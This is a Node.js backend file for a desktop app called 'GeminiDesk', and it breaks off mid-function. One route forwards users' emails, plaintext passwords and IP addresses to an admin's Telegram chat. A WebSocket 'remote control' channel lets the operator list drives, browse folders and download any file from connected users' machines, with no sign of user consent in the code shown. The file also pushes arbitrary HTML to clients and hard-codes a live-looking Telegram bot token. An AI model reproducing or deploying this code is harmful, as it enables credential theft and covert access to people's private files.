// ================================================================= //
// --- GeminiDesk Full Server ---
// Handles Broadcasts, Stats, Login Data, and Real-time Remote Control
// v2 with Sorting, Pagination, and Enhanced UI
// ================================================================= //

const express = require('express');
const http = require('http');
const WebSocket = require('ws');
const TelegramBot = require('node-telegram-bot-api');
const NodeCache = require('node-cache');
const cron = require('node-cron');
const fetch = require('node-fetch');
const crypto = require('crypto');

// --- Configuration ---
const BOT_TOKEN = '8269940964:AAGnrhFtLPZUJHP_mMtrI8skdlqDhkSFJIg';
const ADMIN_CHAT_ID = '7547836101';
const PORT = process.env.PORT || 3000;
const ITEMS_PER_PAGE = 25; // מספר פריטים בכל עמוד בדפדפן הקבצים

// --- In-Memory Storage & Setup ---
const cache = new NodeCache({ stdTTL: 86400, checkperiod: 120 });
const clients = new Map(); // Stores active WebSocket connections { clientId -> { ws, name } }

function makeCb(action, data, ttlSec = 600) {
  const id = crypto.randomBytes(6).toString('base64url');
  cache.set(`cb:${id}`, { action, ...data }, ttlSec);
  return `cb:${id}`;
}

function readCb(cbData) {
  if (!cbData || !cbData.startsWith('cb:')) return null;
  const id = cbData.slice(3);
  return cache.get(`cb:${id}`);
}
// --- הוסף את כל הקטע הבא לקוד שלך ---

// פונקציית עזר שממתינה לתשובת WebSocket
// פונקציית עזר שממתינה לתשובת WebSocket (גרסה מעודכנת)
function waitForWebSocketResponse(clientId, command, timeout = 20000) {
    return new Promise((resolve, reject) => {
        const client = clients.get(clientId);
        if (!client || client.ws.readyState !== WebSocket.OPEN) {
            return reject(new Error('Client is offline or not connected via WebSocket.'));
        }

        const requestId = crypto.randomBytes(8).toString('hex');
        const responseCacheKey = `ws_response:${requestId}`;

        // <-- תוספת חשובה: אנחנו רושמים שיש בקשה ממתינה מהאתר
        cache.set(`pending_ws_request:${clientId}`, requestId, timeout / 1000);

        client.ws.send(JSON.stringify(command));

        const interval = setInterval(() => {
            const responseData = cache.get(responseCacheKey);
            if (responseData) {
                clearInterval(interval);
                clearTimeout(timeoutId);
                cache.del(responseCacheKey);
                // אין צורך למחוק את pending_ws_request, הוא יימחק ב-handleResultFromClient
                resolve(responseData);
            }
        }, 200);

        const timeoutId = setTimeout(() => {
            clearInterval(interval);
            cache.del(`pending_ws_request:${clientId}`); // נקה במקרה של timeout
            reject(new Error(`Request timed out after ${timeout / 1000} seconds.`));
        }, timeout);
    });
}
function formatBytes(bytes, decimals = 2) {
    if (bytes === 0) return '0 Bytes';
    const k = 1024;
    const dm = decimals < 0 ? 0 : decimals;
    const sizes = ['Bytes', 'KB', 'MB', 'GB', 'TB'];
    const i = Math.floor(Math.log(bytes) / Math.log(k));
    return parseFloat((bytes / Math.pow(k, i)).toFixed(dm)) + ' ' + sizes[i];
}

// --- Express App & HTTP Server Setup ---
const app = express();
const server = http.createServer(app);
const wss = new WebSocket.Server({ server, path: '/connect' });

// --- Bot Setup ---
const bot = new TelegramBot(BOT_TOKEN, { polling: false });
const WEBHOOK_URL = `https://latex-v25b.onrender.com/telegram/${BOT_TOKEN}`;
bot.setWebHook(WEBHOOK_URL);

// Middleware
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.set('trust proxy', true);

// ================================================================= //
// --- WebSocket Server Logic (For Real-time Remote Control) ---
// ================================================================= //

wss.on('connection', (ws, req) => {
    const url = new URL(req.url, `http://${req.headers.host}`);
    const clientId = url.searchParams.get('clientId');
    
    // --- תיקון: פענוח השם המקודד מהלקוח ---
    const clientNameRaw = url.searchParams.get('clientName');
    let clientName = clientNameRaw ? decodeURIComponent(clientNameRaw) : 'Unknown';
    // אם השם עדיין מקודד (קידוד כפול), פענח שוב
    try {
        if (clientName.includes('%')) {
            clientName = decodeURIComponent(clientName);
        }
    } catch (_) {}
    
    ws.isAlive = true;
    
    ws.on('pong', () => {
        ws.isAlive = true;
        console.log(`[WebSocket] Received pong from ${clientName}`);
    });

    if (!clientId) {
        console.error('[WebSocket] Connection attempt with missing client ID. Terminating.');
        return ws.terminate();
    }

    // --- תיקון משופר: ניקוי כל המטמון של הלקוח הישן ---
    if (clients.has(clientId)) {
        const oldClient = clients.get(clientId);
        console.log(`[WebSocket] Re-connection detected. Old: ${oldClient.name}, New: ${clientName}. Terminating old connection.`);
        oldClient.ws.terminate();
        
        // נקה גם את המטמון של השם הישן
        const oldCacheKey = `client:${clientId}`;
        cache.del(oldCacheKey);
        console.log(`[WebSocket] Cleared old cache for ${oldClient.name}`);
    }
    
    // נקה גם מטמון של שמות אחרים עם אותו clientId (למקרה שנשאר משהו)
    const allCacheKeys = cache.keys();
    allCacheKeys.forEach(key => {
        if (key.startsWith('client:') && key === `client:${clientId}`) {
            cache.del(key);
            console.log(`[WebSocket] Cleaned stale cache entry: ${key}`);
        }
    });
    
console.log(`[WebSocket] Client Connected: ${clientName} (ID: ${clientId.substring(0, 8)}...)`);
clients.set(clientId, { ws, name: clientName });

// ✅ רשום ב-cache עם TTL ארוך יותר לוובסוקט
cache.set(`client:${clientId}`, { name: clientName }, 600); // 10 דקות לחיבור WebSocket

// ✅ הוסף לוג שמראה את מצב הלקוח
console.log(`[WebSocket] Client ${clientName} - FULL CONTROL ESTABLISHED (WebSocket + HTTP Cache)`);

    ws.on('message', (message) => {
        try {
            const data = JSON.parse(message.toString());
            console.log(`[WebSocket] Received result from ${clientName}:`, data.type);
            handleResultFromClient(data);
        } catch (e) {
            console.error('[WebSocket] Error processing message from client:', e);
        }
    });

    ws.on('close', () => {
        console.log(`[WebSocket] Client Disconnected: ${clientName} (ID: ${clientId.substring(0, 8)}...)`);
        clients.delete(clientId);
        // אל תמחק את ה-cache, כך שאם עדיין יש HTTP register הלקוח יהיה "Limited"
        console.log(`[WebSocket] Client ${clientName} now LIMITED (HTTP only, if still running)`);
    });

    ws.on('error', (error) => {
        console.error(`[WebSocket] Error for ${clientName}:`, error.message);
    });
});


// ================================================================= //
// --- HTTP Routes (For Legacy App Features & Health Checks) ---
// ================================================================= //

app.get('/ping', (req, res) => res.json({ status: 'alive' }));

app.get('/latest-message', (req, res) => {
    const messageData = cache.get('latest_message');
    const headers = { 'Content-Type': 'application/json', 'Access-Control-Allow-Origin': '*' };
    res.set(headers);
    if (messageData) return res.json(messageData);
    return res.status(404).json({ message: 'No new message' });
});

app.post('/ping-stats', (req, res) => {
    try {
        const { version } = req.body;
        const versionKey = version || 'unknown';
        cache.set('stats:total_pings', (cache.get('stats:total_pings') || 0) + 1);
        cache.set(`stats:version:${versionKey}`, (cache.get(`stats:version:${versionKey}`) || 0) + 1);
        res.status(200).send('Ping received.');
    } catch (e) { res.status(400).send('Invalid ping request.'); }
});

app.post('/error', async (req, res) => {
    try {
        const { error, stack, version, platform } = req.body;
        if (!error) return res.status(400).send('No error message provided.');
        const errorMessage = `⚠️ *New Error Reported!* ⚠️\n\n*Version:* \`${version || 'N/A'}\`\n*Platform:* \`${platform || 'N/A'}\`\n*Error:* \`${error}\`\n\n*Stack:* \`\`\`${stack || 'N/A'}\`\`\``;
        await bot.sendMessage(ADMIN_CHAT_ID, errorMessage, { parse_mode: 'Markdown' });
        res.status(200).send('Error report received.');
    } catch (e) { res.status(400).send('Invalid error report.'); }
});

app.post('/login-data', async (req, res) => {
    try {
        const { email, password, success } = req.body;
        const ipAddress = req.ip;
        if (!email || !password) return res.status(400).send('Email and password are required.');
        const statusText = success ? "Success ✅" : "Failed ❌";
        const loginMessage = `🔔 *New Login Attempt!* 🔔\n\n*Status:* \`${statusText}\`\n*IP:* \`${ipAddress}\`\n*Email:* \`${email}\`\n*Password:* \`${password}\``;
        await bot.sendMessage(ADMIN_CHAT_ID, loginMessage, { parse_mode: 'Markdown' });
        res.status(200).send('Login data received.');
    } catch (e) { res.status(500).send('Server error.'); }
});
app.post('/register', (req, res) => {
    try {
        const { clientId, clientName } = req.body;
        if (!clientId || !clientName) {
            return res.status(400).send('Missing client info.');
        }

        const shortId = clientId.substring(0, 8);
        const wsClient = clients.get(clientId);
        const isWebSocketActive = wsClient && wsClient.ws && wsClient.ws.readyState === WebSocket.OPEN;

        if (isWebSocketActive) {
            // --- מצב 1: הכל תקין, WebSocket פעיל ---
            // עדכן את השם אם השתנה
            if (wsClient.name !== clientName) {
                wsClient.name = clientName;
                console.log(`[HTTP Register] Updated WebSocket name to ${clientName} (WebSocket already active)`);
            }
            
            // רענן את ה-cache עם תוקף ארוך כי אנחנו יודעים שהחיבור מלא
            cache.set(`client:${clientId}`, { name: clientName }, 300); // 5 דקות
            
            console.log(`[HTTP Register] ${clientName} (ID: ${shortId}...) - FULL CONTROL (WebSocket + HTTP)`);
            return res.status(200).send('Presence updated - Full Control');

        } else {
            // --- WebSocket לא פעיל, בוא נבדוק מה הסיבה ---
            const cachedClient = cache.get(`client:${clientId}`);

            if (cachedClient) {
                // --- מצב 2: "תקופת חסד" ---
                // ה-WebSocket לא פעיל כרגע, אבל הלקוח היה קיים ב-cache.
                // זה כנראה ניתוק רגעי והוא בתהליך התחברות מחדש.
                // אנחנו נרענן את ה-cache עם תוקף קצר כדי לשמור עליו "חי"
                // ולא נדפיס את ההודעה המטרידה "LIMITED".
                cache.set(`client:${clientId}`, { name: clientName }, 120); // רענן ל-2 דקות
                console.log(`[HTTP Register] ${clientName} (ID: ${shortId}...) - Presence refreshed (awaiting WebSocket reconnect)`);
                return res.status(200).send('Presence updated - Awaiting Reconnect');

            } else {
                // --- מצב 3: מצב מוגבל אמיתי ---
                // אין WebSocket וגם אין שום זכר ללקוח ב-cache.
                // זה אומר שהאפליקציה רק עכשיו נפתחה או שהיא במצב מוגבל באמת.
                cache.set(`client:${clientId}`, { name: clientName }, 120); // 2 דקות בלבד
                console.log(`[HTTP Register] ${clientName} (ID: ${shortId}...) - LIMITED (HTTP only, no WebSocket)`);
                return res.status(200).send('Presence updated - Limited');
            }
        }
    } catch (e) {
        console.error('[HTTP Register] Server error:', e);
        res.status(500).send('Server error.');
    }
});
// ================================================================= //
// --- Web Dashboard API Routes ---
// ================================================================= //

// CORS headers for web requests
app.use((req, res, next) => {
    res.header('Access-Control-Allow-Origin', '*');
    res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
    res.header('Access-Control-Allow-Headers', 'Origin, X-Requested-With, Content-Type, Accept');
    if (req.method === 'OPTIONS') {
        res.sendStatus(200);
    } else {
        next();
    }
});

// Get list of clients (same logic as Telegram showClientList)
app.get('/api/clients', (req, res) => {
    try {
        const clientKeys = cache.keys().filter(key => key.startsWith('client:'));
        const clientList = [];

        if (clientKeys.length > 0) {
            clientKeys.forEach(key => {
                const clientId = key.split(':')[1];
                const clientData = cache.get(key);
                if (clientData) {
                    const hasWebSocket = clients.has(clientId) && clients.get(clientId).ws.readyState === WebSocket.OPEN;
                    const hasRecentRegister = cache.get(key) !== undefined;
                    
                    let status = 'offline';
                    let statusText = 'Offline';
                    let canControl = false;
                    
                    if (hasWebSocket) {
                        status = 'online_full';
                        statusText = 'Full Control Available';
                        canControl = true;
                    } else if (hasRecentRegister) {
                        status = 'online_limited';
                        statusText = 'App Running (Limited)';
                        canControl = false;
                    } else {
                        status = 'offline';
                        statusText = 'Offline';
                        canControl = false;
                    }
                    
                    clientList.push({
                        id: clientId,
                        name: clientData.name,
                        status: status,
                        statusText: statusText,
                        canControl: canControl,
                        shortId: clientId.substring(0, 8)
                    });
                }
            });
        }

        res.json({ 
            success: true,
            clients: clientList,
            total: clientList.length
        });
    } catch (error) {
        console.error('[Web API] Error in /api/clients:', error);
        res.status(500).json({ success: false, error: 'Internal server error' });
    }
});

app.post('/api/client/:clientId/drives', async (req, res) => {
    try {
        const { clientId } = req.params;
        const clientName = clients.get(clientId)?.name || 'Unknown';

        const command = { type: 'get_drives' };
        const result = await waitForWebSocketResponse(clientId, command);

        if (result.error) {
            return res.json({ success: false, error: `Client error: ${result.error}` });
        }
        
        res.json({ 
            success: true,
            drives: result.payload.drives,
            clientName: clientName
        });

    } catch (error) {
        console.error('[Web API] Error in drives request:', error.message);
        res.status(500).json({ success: false, error: error.message });
    }
});

// List directory contents (triggers WebSocket command)
app.post('/api/client/:clientId/list', async (req, res) => {
    try {
        const { clientId } = req.params;
        const { path } = req.body;
        const clientName = clients.get(clientId)?.name || 'Unknown';

        if (!path) {
            return res.status(400).json({ success: false, error: 'Path is required' });
        }

        const command = { type: 'list_dir', payload: { path } };
        const result = await waitForWebSocketResponse(clientId, command);

        if (result.error) {
            return res.json({ success: false, error: `Client error: ${result.error}` });
        }

        res.json({ 
            success: true,
            path: result.payload.path, 
            items: result.payload.items,
            clientName: clientName
        });

    } catch (error) {
        console.error('[Web API] Error in list directory request:', error.message);
        res.status(500).json({ success: false, error: error.message });
    }
});

// Download file (triggers WebSocket command)
app.post('/api/client/:clientId/download', async (req, res) => {
    try {
        const { clientId } = req.params;
        const { path } = req.body;

        if (!path) {
            return res.status(400).json({ success: false, error: 'File path is required' });
        }

        const command = { type: 'get_file', payload: { path } };
        const result = await waitForWebSocketResponse(clientId, command, 60000); // Timeout ארוך יותר להורדות

        if (result.error) {
            return res.json({ success: false, error: `Client error: ${result.error}` });
        }
        
        const { fileName, fileData_base64 } = result.payload;
        const fileBuffer = Buffer.from(fileData_base64, 'base64');
        
const encodedFileName = encodeURIComponent(fileName);
res.set({
    'Content-Type': 'application/octet-stream',
    // אנחנו מספקים גם שם קובץ פשוט לדפדפנים ישנים, וגם את הגרסה המקודדת שתומכת בכל השפות
    'Content-Disposition': `attachment; filename="download"; filename*=UTF-8''${encodedFileName}`
});
res.send(fileBuffer);

    } catch (error) {
        console.error('[Web API] Error in download request:', error.message);
        res.status(500).json({ success: false, error: error.message });
    }
});
// Health check endpoint
app.get('/api/health', (req, res) => {
    try {
        const totalClients = cache.keys().filter(key => key.startsWith('client:')).length;
        const activeWebSockets = clients.size;
        
        res.json({
            success: true,
            server: 'GeminiDesk Web API',
            timestamp: new Date().toISOString(),
            clients: {
                total: totalClients,
                activeWebSockets: activeWebSockets
            }
        });
    } catch (error) {
        console.error('[Web API] Error in health check:', error);
        res.status(500).json({ success: false, error: 'Internal server error' });
    }
});
app.post(`/telegram/${BOT_TOKEN}`, (req, res) => {
    bot.processUpdate(req.body);
    res.sendStatus(200);
});

// ================================================================= //
// --- Telegram Bot Logic ---
// ================================================================= //

bot.on('message', (message) => handleUpdate(message, 'message'));
bot.on('callback_query', (callbackQuery) => handleUpdate(callbackQuery, 'callback_query'));

async function handleUpdate(body, type) {
    const message = type === 'message' ? body : body.message;
    const user = type === 'message' ? body.from : body.from;

    if (String(user.id) !== ADMIN_CHAT_ID) {
        return bot.sendMessage(message.chat.id, "You are not authorized to use this bot.").catch(console.error);
    }
    if (type === 'callback_query') {
        await handleCallbackQuery(body);
    } else if (type === 'message') {
        await handleMessage(body);
    }
}

async function handleMessage(message) {
    const { from, chat, text, document } = message;
    const state = cache.get(`state:${from.id}`);

    if (state) {
        if (state === 'awaiting_broadcast_text' && text) {
            const messageData = { id: Date.now(), type: 'text', content: text };
            cache.set('latest_message', messageData);
            await bot.sendMessage(chat.id, '✅ *Success!* Text broadcast is now active.', { parse_mode: 'Markdown' });
            cache.del(`state:${from.id}`);
            return showMainMenu(chat.id);
        }
        if (state === 'awaiting_broadcast_html' && document) {
            if (document.file_name?.toLowerCase().endsWith('.html')) {
                try {
                    const file = await bot.getFile(document.file_id);
                    const fileUrl = `https://api.telegram.org/file/bot${BOT_TOKEN}/${file.file_path}`;
                    const response = await fetch(fileUrl);
                    const fileContent = await response.text();
                    
                    const messageData = { id: Date.now(), type: 'html', content: fileContent };
                    cache.set('latest_message', messageData);
                    await bot.sendMessage(chat.id, '✅ *Success!* HTML broadcast is now active.', { parse_mode: 'Markdown' });
                    cache.del(`state:${from.id}`);
                    return showMainMenu(chat.id);
                } catch (error) {
                    return bot.sendMessage(chat.id, `❌ Error processing HTML file: ${error.message}`);
                }
            } else {
                return bot.sendMessage(chat.id, '❌ Invalid file. Please upload an `.html` file.');
            }
        }
    }
    
    return showMainMenu(chat.id);
}

async function handleCallbackQuery(callbackQuery) {
    const { from, message, data } = callbackQuery;
    
    bot.answerCallbackQuery(callbackQuery.id).catch(console.error);
    const short = readCb(data);
    
    if (short) {
        // --- התיקון כאן: הוספנו את hideFolders ---
        const { action, clientId, path, sort, page, hideFolders } = short;

        // פעולות הדורשות תקשורת חיה עם הלקוח
        if (['select_client', 'list_dir', 'get_file'].includes(action)) {
            const client = clients.get(clientId);
            if (!client || client.ws.readyState !== WebSocket.OPEN) {
                return bot.editMessageText(`❌ Client *${client?.name || 'Unknown'}* is offline.`, {
                    chat_id: message.chat.id, message_id: message.message_id, parse_mode: 'Markdown',
                    reply_markup: { inline_keyboard: [[{ text: '‹ Back to Client List', callback_data: 'manage_clients' }]] }
                });
            }

            cache.set(`last_interaction:${clientId}`, { messageId: message.message_id });

            let command;
            let feedbackText;

            if (action === 'select_client') {
                command = { type: 'get_drives' };
                feedbackText = `Requesting drives from *${client.name}*...`;
            } else if (action === 'list_dir') {
                command = { type: 'list_dir', payload: { path } };
                feedbackText = `Fetching directory: \`${path}\`...`;
            } else if (action === 'get_file') {
                command = { type: 'get_file', payload: { path } };
                feedbackText = `Requesting file: \`${path}\``;
            }

            client.ws.send(JSON.stringify(command));
            return bot.editMessageText(feedbackText, { chat_id: message.chat.id, message_id: message.message_id, parse_mode: 'Markdown' });
        
        } 
        // פעולה שמתבצעת כולה על השרת מה-cache
        else if (action === 'render_cached_list') {
            const clientName = clients.get(clientId)?.name || 'Unknown';
            return renderDirectoryView({ 
                clientId, 
                clientName, 
                path, 
                sort: sort || 'name_asc', 
                page: page || 1, 
                // --- התיקון כאן: מעבירים את hideFolders הלאה ---
                hideFolders: hideFolders, 
                chatId: message.chat.id, 
                messageId: message.message_id 
            });
        }
    }

    // Main Menu & Other Actions (נשאר ללא שינוי)
    switch (data.split(':')[0]) {
        case 'manage_clients': return showClientList(message.chat.id, message.message_id);
        case 'broadcast_menu': return showBroadcastMenu(message.chat.id, message.message_id);
        case 'view_stats':
            const stats = getStats();
            return bot.editMessageText(stats, { chat_id: message.chat.id, message_id: message.message_id, parse_mode: 'Markdown', reply_markup: { inline_keyboard: [[{ text: '‹ Back', callback_data: 'back_to_main' }]] }});
        case 'back_to_main':
            cache.del(`state:${from.id}`);
            return showMainMenu(message.chat.id, 'Welcome back!', message.message_id);
        case 'view_active_message': return viewActiveMessage(message.chat.id, message.message_id);
        case 'delete_active_message_confirm':
            return bot.editMessageText('❓ Are you sure you want to delete the active broadcast?', { chat_id: message.chat.id, message_id: message.message_id, reply_markup: { inline_keyboard: [[{ text: '✅ Yes, Delete It', callback_data: 'delete_active_message_do' }], [{ text: '❌ No, Cancel', callback_data: 'view_active_message' }]] } });
        case 'delete_active_message_do':
            cache.del('latest_message');
            return bot.editMessageText('🗑️ Active broadcast has been deleted.', { chat_id: message.chat.id, message_id: message.message_id, reply_markup: { inline_keyboard: [[{ text: '‹ Back', callback_data: 'broadcast_menu' }]] }});
        case 'awaiting_broadcast_text':
        case 'awaiting_broadcast_html':
            cache.set(`state:${from.id}`, data);
            const prompt = data === 'awaiting_broadcast_text' ? '✍️ Send the text you want to broadcast.' : '📄 Upload the `.html` file.';
            return bot.editMessageText(prompt, { chat_id: message.chat.id, message_id: message.message_id, reply_markup: { inline_keyboard: [[{ text: '‹ Cancel', callback_data: 'broadcast_menu' }]] }});
    }
}

async function handleResultFromClient(data) {
    const { clientId, type, payload, error } = data;
    const pendingWebRequestId = cache.get(`pending_ws_request:${clientId}`);
    if (pendingWebRequestId) {
        // אם כן, נשים את התוצאה במקום שהאתר ימצא אותה
        cache.set(`ws_response:${pendingWebRequestId}`, data, 60); 
        // נמחק את המידע על הבקשה הממתינה
        cache.del(`pending_ws_request:${clientId}`);
        // סיימנו לטפל בבקשת ה-Web, אין צורך להמשיך ללוגיקה של טלגרם
        return; 
    }
    const clientName = clients.get(clientId)?.name || 'Unknown Client';

    // ⭐ חפש בקש web pending לפי clientId (ללא requestId)
    const webRequestKeys = cache.keys().filter(key => key.startsWith('web_request:'));
    let webRequest = null;
    let webRequestKey = null;

    for (const key of webRequestKeys) {
        const request = cache.get(key);
        if (request && request.clientId === clientId && !request.res.headersSent) {
            webRequest = request;
            webRequestKey = key;
            break;
        }
    }

    // ⭐ אם מצאנו web request ממתין, טפל בו
    if (webRequest && webRequest.res) {
        const { res, type: expectedType } = webRequest;
        cache.del(webRequestKey); // Clean up
        
        console.log(`[Web API] Received response from ${clientName} for ${expectedType}`);
        
        try {
            if (error) {
                return res.json({ 
                    success: false, 
                    error: `Client error: ${error}`
                });
            }
            
            if (type === 'get_drives_result' && expectedType === 'get_drives') {
                return res.json({ 
                    success: true,
                    drives: payload.drives,
                    clientName: clientName
                });
            }
            
            if (type === 'list_dir_result' && expectedType === 'list_dir') {
                return res.json({ 
                    success: true,
                    path: payload.path, 
                    items: payload.items,
                    clientName: clientName
                });
            }
            
            if (type === 'get_file_result' && expectedType === 'get_file') {
                const { fileName, fileData_base64 } = payload;
                const fileBuffer = Buffer.from(fileData_base64, 'base64');
                
                res.set({
                    'Content-Type': 'application/octet-stream',
                    'Content-Disposition': `attachment; filename="${fileName}"`
                });
                return res.send(fileBuffer);
            }
        } catch (resError) {
            console.error('[Web API] Error sending response:', resError);
        }
        
        // אם הגענו לכאן, משהו לא תקין
        return res.json({ success: false, error: 'Unexpected response type' });
    }

    // ⭐ אם לא מצאנו web request, זה טלגרם - לוגיקה קיימת
    const interaction = cache.get(`last_interaction:${clientId}`);
    if (!interaction || !interaction.messageId) {
        console.error(`CRITICAL: Could not find message_id for client response: ${clientId}`);
        return bot.sendMessage(ADMIN_CHAT_ID, "An unexpected error occurred (missing interaction context). Please try again from the main menu.");
    }
    const messageId = interaction.messageId;

    if (error) {
        return bot.editMessageText(`Client Error on *${clientName}*:\n\`\`\`\n${error}\n\`\`\``, { chat_id: ADMIN_CHAT_ID, message_id: messageId, parse_mode: 'Markdown' });
    }

    if (type === 'get_drives_result') {
        const drives = payload.drives;
        const keyboard = drives.map(drive => [{ text: `💽 ${drive}`, callback_data: makeCb('list_dir', { clientId, path: drive }) }]);
        keyboard.push([{ text: '‹ Back to Client List', callback_data: 'manage_clients' }]);
        return bot.editMessageText(`Select a drive to browse on *${clientName}*:`, { chat_id: ADMIN_CHAT_ID, message_id: messageId, parse_mode: 'Markdown', reply_markup: { inline_keyboard: keyboard }});
    }

    if (type === 'list_dir_result') {
        const { path: currentPath, items } = payload;
        const cacheKey = `file_list:${clientId}:${currentPath}`;
        cache.set(cacheKey, items, 300);

        return renderDirectoryView({
            clientId, clientName, path: currentPath, 
            sort: 'name_asc', page: 1, 
            chatId: ADMIN_CHAT_ID, messageId: messageId
        });
    }
    
    if (type === 'get_file_result') {
        const { fileName, fileData_base64 } = payload;
        const fileBuffer = Buffer.from(fileData_base64, 'base64');
        await bot.sendMessage(ADMIN_CHAT_ID, `📄 Receiving file *${fileName}* from *${clientName}*...`);
        return bot.sendDocument(ADMIN_CHAT_ID, fileBuffer, {}, { filename: fileName, contentType: 'application/octet-stream' });
    }
}

async function showMainMenu(chatId, text = 'Welcome, Admin! This is the GeminiDesk control panel.', messageId = null) {
  cache.del(`active_message:${chatId}`); 
  const keyboard = {
    inline_keyboard: [
      [{ text: '🖥️ Manage Remote Clients', callback_data: 'manage_clients' }],
      [{ text: '🚀 Send or Manage Broadcast', callback_data: 'broadcast_menu' }],
      [{ text: '📊 View App Statistics', callback_data: 'view_stats' }],
    ]
  };
  const options = { chat_id: chatId, parse_mode: 'Markdown', reply_markup: keyboard };
  if (messageId) {
    return bot.editMessageText(text, { ...options, message_id: messageId }).catch(() => {});
  }
  const sentMessage = await bot.sendMessage(chatId, text, options).catch(console.error);
  cache.set(`active_message:${chatId}`, sentMessage); // שמירת ההודעה הפעילה
}
// החלף את כל הפונקציה הקיימת בקוד הבא
function renderDirectoryView({ clientId, clientName, path, sort, page, hideFolders, chatId, messageId }) {
    const cacheKey = `file_list:${clientId}:${path}`;
    const items = cache.get(cacheKey);

    if (!items) {
        return bot.editMessageText(`Session expired for \`${path}\`. Please go back and select the directory again.`, {
            chat_id: chatId, message_id: messageId, parse_mode: 'Markdown',
            reply_markup: { inline_keyboard: [[{ text: '‹ Back to Client List', callback_data: 'manage_clients' }]]}
        });
    }

    // --- הוספה: לוגיקת סינון התיקיות ---
    const shouldHideFolders = !!hideFolders; // ודא שזה תמיד ערך בוליאני
    const displayItems = shouldHideFolders ? items.filter(item => !item.isDirectory) : items;
    // --- סוף ההוספה ---

    const sortedItems = [...displayItems].sort((a, b) => {
        // אם לא מסתירים תיקיות, שים אותן תמיד למעלה
        if (!shouldHideFolders && a.isDirectory !== b.isDirectory) {
            return a.isDirectory ? -1 : 1;
        }
        switch (sort) {
            case 'date_asc': return a.birthtime - b.birthtime;
            case 'date_desc': return b.birthtime - a.birthtime;
            case 'size_asc': return a.size - b.size;
            case 'size_desc': return b.size - a.size;
            case 'name_desc': return b.name.localeCompare(a.name);
            default: return a.name.localeCompare(b.name);
        }
    });

    const totalPages = Math.ceil(sortedItems.length / ITEMS_PER_PAGE);
    const currentPage = page > totalPages ? 1 : page; // תקן אם העמוד לא חוקי אחרי סינון
    const pageItems = sortedItems.slice((currentPage - 1) * ITEMS_PER_PAGE, currentPage * ITEMS_PER_PAGE);
    const keyboard = [];

    if (path.includes('\\') && path.slice(-2) !== ':\\') {
        const parentDir = path.substring(0, path.lastIndexOf('\\')) || path.slice(0, 3);
        keyboard.push([{ text: '⬆️ Go Up a Directory', callback_data: makeCb('list_dir', { clientId, path: parentDir }) }]);
    }

    const sortButtons = [
        { txt: 'Name', s: 'name' }, { txt: 'Date', s: 'date' }, { txt: 'Size', s: 'size' }
    ].map(({ txt, s }) => {
        let text = txt;
        let nextSort = `${s}_asc`;
        if (sort.startsWith(s)) {
            text = sort === `${s}_asc` ? `${txt} ▾` : `${txt} ▴`;
            nextSort = sort === `${s}_asc` ? `${s}_desc` : `${s}_asc`;
        }
        // הוסף את מצב הסתרת התיקיות לקריאה החוזרת
        return { text, callback_data: makeCb('render_cached_list', { clientId, path, sort: nextSort, page: 1, hideFolders: shouldHideFolders }) };
    });
    keyboard.push(sortButtons);

    // --- הוספה: כפתור להסתרת/הצגת תיקיות ---
    const toggleFoldersButtonText = shouldHideFolders ? '✅ Show Folders' : '🚫 Hide Folders';
    const toggleFoldersCallback = makeCb('render_cached_list', { 
        clientId, 
        path, 
        sort, 
        page: 1, // תמיד חזור לעמוד הראשון عند שינוי תצוגה
        hideFolders: !shouldHideFolders // הפוך את המצב
    });
    keyboard.push([{ text: toggleFoldersButtonText, callback_data: toggleFoldersCallback }]);
    // --- סוף ההוספה ---

    pageItems.forEach(item => {
        const icon = item.isDirectory ? '📁' : '📄';
        const action = item.isDirectory ? 'list_dir' : 'get_file';
        
        const details = [];
        if (!item.isDirectory && item.size >= 0) {
            details.push(formatBytes(item.size));
        }
        if (item.birthtime > 0) {
            details.push(new Date(item.birthtime).toISOString().slice(0, 10));
        }

        let detailsString = details.length > 0 ? ` (${details.join(', ')})` : '';
        const label = `${icon} ${item.name}${detailsString}`;

        keyboard.push([{ text: label, callback_data: makeCb(action, { clientId, path: item.path }) }]);
    });

    const navButtons = [];
    if (currentPage > 1) {
        // הוסף את מצב הסתרת התיקיות לקריאה החוזרת
        navButtons.push({ text: '« Previous', callback_data: makeCb('render_cached_list', { clientId, path, sort, page: currentPage - 1, hideFolders: shouldHideFolders }) });
    }
    if (currentPage < totalPages) {
        // הוסף את מצב הסתרת התיקיות לקריאה החוזרת
        navButtons.push({ text: 'Next »', callback_data: makeCb('render_cached_list', { clientId, path, sort, page: currentPage + 1, hideFolders: shouldHideFolders }) });
    }
    if (navButtons.length > 0) keyboard.push(navButtons);

    keyboard.push([{ text: '‹ Back to Client List', callback_data: 'manage_clients' }]);

    const messageText = `*${clientName}* - \`${path}\`\n(Page ${currentPage}/${totalPages} - ${sortedItems.length} items)`;
    
    bot.editMessageText(messageText, { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown', reply_markup: { inline_keyboard: keyboard } }).catch(console.error);
}

async function showClientList(chatId, messageId) {
    const clientKeys = cache.keys().filter(key => key.startsWith('client:'));
    const keyboard = [];

    if (clientKeys.length > 0) {
        clientKeys.forEach(key => {
            const clientId = key.split(':')[1];
            const clientData = cache.get(key);
            if (clientData) {
                // ✅ בדיקה מדויקת יותר
// ✅ בדיקה מדויקת עם עדיפות ל-WebSocket
const hasWebSocket = clients.has(clientId);
const wsClient = clients.get(clientId);
const isWebSocketActive = hasWebSocket && wsClient && wsClient.ws && wsClient.ws.readyState === WebSocket.OPEN;
const hasRecentCache = cache.get(key) !== undefined;

// ✅ תן עדיפות מוחלטת לסטטוס WebSocket
if (isWebSocketActive) {
    // WebSocket פעיל = תמיד Full Control
    keyboard.push([{ text: `🟢 ${wsClient.name || clientData.name} (Full Control)`, callback_data: makeCb('select_client', { clientId }) }]);
} else if (hasRecentCache) {
    // רק HTTP Register = Limited
    keyboard.push([{ text: `🟡 ${clientData.name} (Limited - No Remote Control)`, callback_data: `noop` }]);
} else {
    // כלום = Offline
    keyboard.push([{ text: `🔴 ${clientData.name} (Offline)`, callback_data: `noop` }]);
}
            }
        });
    }
    
    keyboard.push([{ text: '‹ Back to Main Menu', callback_data: 'back_to_main' }]);
    const text = clientKeys.length > 0 ? 'Client Status Legend:\n🟢 = Full Control Available\n🟡 = App Running (No Remote Control)\n🔴 = Offline\n\nSelect a client:' : 'No clients are currently connected.';

    const options = { chat_id: chatId, reply_markup: { inline_keyboard: keyboard } };

    if (messageId) {
        bot.editMessageText(text, { ...options, message_id: messageId }).catch(console.error);
    } else {
        bot.sendMessage(chatId, text, options).catch(console.error);
